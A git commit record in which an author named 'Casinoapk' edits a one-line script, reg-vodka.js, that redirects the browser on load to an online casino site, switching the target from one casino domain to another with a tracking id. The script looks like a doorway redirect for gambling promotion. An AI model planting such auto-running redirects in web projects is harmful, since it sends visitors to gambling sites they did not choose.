190820b1ec8c569ef0529c74c9deddfae721a301
Casinoapk <stelelena7@gmail.com>
2025-04-10 20:39:08 +0300

    Update reg-vodka.js

--- go/reg-vodka.js
+++ go/reg-vodka.js
@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://vodkacasino.store/vodka.html"}executeRun();
+function executeRun(){window.location.href="https://vodka4.xyz?id=8091"}executeRun();
